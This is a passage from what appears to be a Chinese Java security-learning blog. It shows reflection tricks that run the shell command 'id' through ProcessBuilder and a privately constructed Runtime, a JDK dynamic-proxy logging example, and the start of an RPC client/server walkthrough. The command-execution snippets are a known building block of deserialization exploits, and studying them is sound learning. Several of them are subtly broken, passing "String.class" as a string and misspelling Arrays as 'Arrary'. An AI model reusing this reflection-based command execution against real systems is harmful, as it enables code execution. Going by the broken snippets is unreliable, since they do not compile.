<li><code>public ProcessBuilder(String... command)</code>(此处，String<code>...</code>这种语法表示String参数数量是可变的，与String[]一样)</li>
</ul>
<p>分别执行构造方法获取实例的语句如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructor(<span class="string">&quot;String.class&quot;</span>).newInstance(<span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructor(<span class="string">&quot;List.class&quot;</span>).newInstance(Arrays.asList(<span class="string">&quot;id&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>执行完构造方法获取实例之后，其实可以通过类型强制转化，进而执行start()函数来执行命令。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(<span class="string">&quot;List.class&quot;</span>).newInstance(Arrays.asList(<span class="string">&quot;id&quot;</span>))).start();</span><br></pre></td></tr></table></figure>
<p>但实际情况下并不一定可以这样利用，所以继续使用反射机制调用start函数,start函数不是一个静态函数,需要传入类的实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(<span class="string">&quot;List.class&quot;</span>).newInstance(Arrary.asList(<span class="string">&quot;id&quot;</span>)));</span><br></pre></td></tr></table></figure>
<h3 id="执行私有方法">执行私有方法</h3>
<p>以上都是方法或构造方法是public函数，用的都是getMethod、getConstructor，接下来需要使用getDeclaredMethod、getDeclaredConstructor：</p>
<ul>
<li>getMethod等方法获取的是当前类中所有公共方法，包括从父类继承的方法</li>
<li>getDeclared等方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</li>
</ul>
<p>之前说到Runtime的构造方式是一个私有方法，从而不能直接调用，那么接下来我们来调用Runtime的构造方法来获取一个实例来执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor();</span><br><span class="line">cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(cons.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>在获取到私有方法后，通过<code>setAccessible(true)</code>可以打破私有方法访问限制，从而进行调用。</p>
<blockquote>
<p>待填坑…</p>
</blockquote>
]]></content>
      <categories>
        <category>Web安全基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习之动态代理</title>
    <url>/Java/code/7.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="Java基础学习之动态代理">Java基础学习之动态代理</h1>
<p>参考：</p>
<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p>
<p><a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open">https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open</a></p>
<p>我们都知道，Java中继承了<code>intrerface</code>接口的实现类必须实现接口中声明的方法，并且所有<code>interface</code>类型的变量总是通过向上转型并指向某个实例的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CharSequence cs = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure>
<p>那么有没有可能不编写实现类，直接在运行期创建某个<code>interface</code>的实例呢？Java中的动态代理机制可以完成这个任务，即动态代理机制可以在运行期间动态创建某个<code>interface</code>实例。所谓动态，就是和静态相对应的，首先来看静态代码是怎么写的。</p>
<p>定义接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> <span class="keyword">implements</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Good morning &quot;</span> + name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建实例，转型为接口并调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hello hello = <span class="keyword">new</span> HelloWorld();</span><br><span class="line">hello.morning(<span class="string">&quot;ca01h&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>还有一种方式是动态代码，仍然先定义接口<code>Hello</code>，但这次并不去实现类，而是直接通过JDK提供的一个<code>Proxy.newProxyInstance()</code>创建一个<code>Hello</code>接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。</p>
<p>一个最简单的动态代理实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    InvocationHandler handler = <span class="keyword">new</span> InvocationHandler()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        System.out.println(method);</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>))&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;Good morning &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Hello hello = (Hello)Proxy.newProxyInstance(</span><br><span class="line">    	Hello.class.getClassLoader(),</span><br><span class="line">      <span class="keyword">new</span> Class[] &#123;Hello.class&#125;,</span><br><span class="line">      handler);</span><br><span class="line">    hello.morning(<span class="string">&quot;ca01h&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">morning</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面这个例子可以看出，在运行期动态创建一个<code>interface</code>实例的方法如下：</p>
<ol>
<li>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用；</li>
<li>通过<code>Proxy.newProxyInstance()</code>创建<code>interface</code>实例，它需要3个参数：
<ol>
<li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li>
<li>需要实现的接口数组，至少需要传入一个接口进去；</li>
<li>用来处理接口方法调用的<code>InvocationHandler</code>实例。</li>
</ol>
</li>
<li>将返回的<code>Object</code>强制转型为接口。</li>
</ol>
<p>把上面的动态代理改写为静态实现类大概长这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class HelloDynamicProxy implements Hello &#123;</span><br><span class="line">    InvocationHandler handler;</span><br><span class="line">    public HelloDynamicProxy(InvocationHandler handler) &#123;</span><br><span class="line">        this.handler &#x3D; handler;</span><br><span class="line">    &#125;</span><br><span class="line">    public void morning(String name) &#123;</span><br><span class="line">        handler.invoke(</span><br><span class="line">           this,</span><br><span class="line">           Hello.class.getMethod(&quot;morning&quot;, String.class),</span><br><span class="line">           new Object[] &#123; name &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Java动态代理主要使用场景：</strong></p>
<ol>
<li>统计方法执行所耗时间。</li>
<li>在方法执行前后添加日志。</li>
<li>检测方法的参数或返回值。</li>
<li>方法访问权限控制。</li>
<li>方法<code>Mock</code>测试。</li>
</ol>
<p>接下来就演示一下动态代理添加方法调用日志的示例。</p>
<p>假设我们有一个叫做<code>FileSystem</code>接口，<code>UnixFileSystem</code>类实现了<code>FileSystem</code>接口，我们可以使用<code>JDK动态代理</code>的方式给<code>FileSystem</code>的接口方法执行前后都添加日志输出。</p>
<p>接口FileSystem.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">FileSystem</span> <span class="keyword">extends</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    String[] list(File file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现接口UnixFileSystem.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnixFileSystem</span> <span class="keyword">implements</span> <span class="title">FileSystem</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] list(File file) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在执行[&quot;</span> + <span class="keyword">this</span>.getClass().getName() + <span class="string">&quot;]类的list方法，参数[&quot;</span> + file + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> file.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>动态代理处理类JDKInvocationHandler.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDKInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JDKInvocationHandler</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;toString&quot;</span>.equals(method.getName()))&#123;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;即将调用[&quot;</span> + target.getClass().getName() + <span class="string">&quot;]类的[&quot;</span> + method.getName() + <span class="string">&quot;]方法...&quot;</span>);</span><br><span class="line">        Object obj = method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;已完成[&quot;</span> + target.getClass().getName() + <span class="string">&quot;]类的[&quot;</span> + method.getName() + <span class="string">&quot;]方法调用...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FileSystemProxyTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileSystemProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        FileSystem fileSystem = <span class="keyword">new</span> UnixFileSystem();</span><br><span class="line"></span><br><span class="line">        FileSystem proxyInstance = (FileSystem) Proxy.newProxyInstance(</span><br><span class="line">                FileSystem.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;FileSystem.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> JDKInvocationHandler(fileSystem)</span><br><span class="line">        );</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理生成的类名:&quot;</span> + proxyInstance.getClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理生成的类名toString:&quot;</span> + proxyInstance.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用动态代理的方式UnixFileSystem方法</span></span><br><span class="line">        String[] files = proxyInstance.list(<span class="keyword">new</span> File(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;UnixFileSystem.list方法执行结果:&quot;</span> + Arrays.toString(files));</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> isFileSystem     = proxyInstance <span class="keyword">instanceof</span> FileSystem;</span><br><span class="line">        <span class="keyword">boolean</span> isUnixFileSystem = proxyInstance <span class="keyword">instanceof</span> UnixFileSystem;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理类[&quot;</span> + proxyInstance.getClass() + <span class="string">&quot;]是否是FileSystem类的实例:&quot;</span> + isFileSystem);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;动态代理类[&quot;</span> + proxyInstance.getClass() + <span class="string">&quot;]是否是UnixFileSystem类的实例:&quot;</span> + isUnixFileSystem);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210311102147.png" alt=""></p>
]]></content>
      <categories>
        <category>编程</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习之演练过程</title>
    <url>/Java/code/8.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%BC%94%E7%BB%83%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Java基础学习之RPC演进过程">Java基础学习之RPC演进过程</h1>
<p>参考：</p>
<p><a href="https://www.bilibili.com/video/BV1zE41147Zq?from=search&amp;seid=13740626242455157002">https://www.bilibili.com/video/BV1zE41147Zq?from=search&amp;seid=13740626242455157002</a></p>
<p>首先定义一个User类，只有两个字段：<code>id</code>和<code>name</code>，并且继承序列化<code>Serilizable</code>接口。</p>
<p>User.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(Integer id, String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着定义一个<code>IUserService</code>接口类，其中只有一个方法<code>findUserById</code>，通过<code>id</code>字段返回一个User对象。</p>
<p>IUserService.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IUserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第一个版本">第一个版本</h2>
<p>首先来看第一个实现RPC的最原始版本。在上面common包中声明了<code>IUserService</code>接口，这里实现这个接口，简单起见，<code>name</code>字段为一个固定值，<code>id</code>字段通过传参传进来。</p>
<p>UserServiceImpl.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">IUserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(id, <span class="string">&quot;ca01h&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着实现服务端代码，在这个例子中，服务端代码的核心就是接收客户端传过来的<code>id</code>参数，然后调用<code>getUserById</code>函数返回一个User对象给客户端，但是由于User对象并不是一个基础类型，我们也没有定义他的序列化和反序列化的方式，所以在第一个版本中直接返回<code>id</code>和<code>name</code>两个参数。</p>
<p>Server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            Socket s = ss.accept();</span><br><span class="line">            process(s);</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Socket s)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InputStream in = s.getInputStream();</span><br><span class="line">        OutputStream out = s.getOutputStream();</span><br><span class="line">        DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(out);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> id = dis.readInt();</span><br><span class="line">        IUserService service = <span class="keyword">new</span> UserServiceImpl();</span><br><span class="line">        User user = service.findUserById(id);</span><br><span class="line">        dos.writeInt(user.getId());</span><br><span class="line">        dos.writeUTF(user.getName());</span><br><span class="line">        dos.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>client.java</p>
<p>最后完成客户端代码，客户端代码首先连接服务端开启的端口，然后再向服务端传入<code>id</code>参数，最后用阻塞的方式读取服务端传回来的结果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(baos);</span><br><span class="line">        dos.writeInt(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        s.getOutputStream().write(baos.toByteArray());</span><br><span class="line">        s.getOutputStream().flush();</span><br><span class="line"></span><br><span class="line">        DataInputStream dis = <span class="keyword">new</span> DataInputStream(s.getInputStream());</span><br><span class="line">        <span class="keyword">int</span> id = dis.readInt();</span><br><span class="line">        String name = dis.readUTF();</span><br><span class="line">        User user = <span class="keyword">new</span> User(id, name);</span><br><span class="line"></span><br><span class="line">        System.out.println(user);</span><br><span class="line"></span><br><span class="line">        dos.close();</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>**问题所在：不难看出，在这个例子中，初始版本最大的问题在于，如果我要对User类做修改，比如新增一些字段，或者直接新增一个Product类，那么我的客户端和服务端的代码就需要大量修改，显然不符合重用性和简洁性原则。**继续来看第二个版本。</p>
<h2 id="第二个版本">第二个版本</h2>
<p>在第二个版本中我们只做一个改进，把客户端关于网络连接和数据传输的具体过程抽象到另外一个代理类中，这个类的名字叫做<code>Stub</code>。</p>
<p>Stub.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(Integer id)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(baos);</span><br><span class="line">        dos.writeInt(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        s.getOutputStream().write(baos.toByteArray());</span><br><span class="line">        s.getOutputStream().flush();</span><br><span class="line"></span><br><span class="line">        DataInputStream dis = <span class="keyword">new</span> DataInputStream(s.getInputStream());</span><br><span class="line">        <span class="keyword">int</span> receivedId = dis.readInt();</span><br><span class="line">        String name = dis.readUTF();</span><br><span class="line">        User user = <span class="keyword">new</span> User(receivedId, name);</span><br><span class="line"></span><br><span class="line">        dos.close();</span><br><span class="line">        s.close();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么客户端代码就直接调用Stub类中的<code>findUserById</code>方法即可，服务端的代码不需要变动。</p>
<p>Client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Stub stub = <span class="keyword">new</span> Stub();</span><br><span class="line">        System.out.println(stub.findUserById(<span class="number">123</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个版本的RPC代码相对上一个版本改进不大，因为Stub只实现了一个对象类中的一个方法，这样的调用会显得不太合理，甚至很弱鸡。接着来看第三个版本。</p>
<h2 id="第三个版本">第三个版本</h2>
<p>上一个版本的代码只实现了<code>findUserById</code>，如果有一个<code>findUserByName</code>的新方法，那么又得在Stub类中再写一个函数，但是下面这种写法就解决了函数增加的问题。</p>
<p>Stub.class</p>
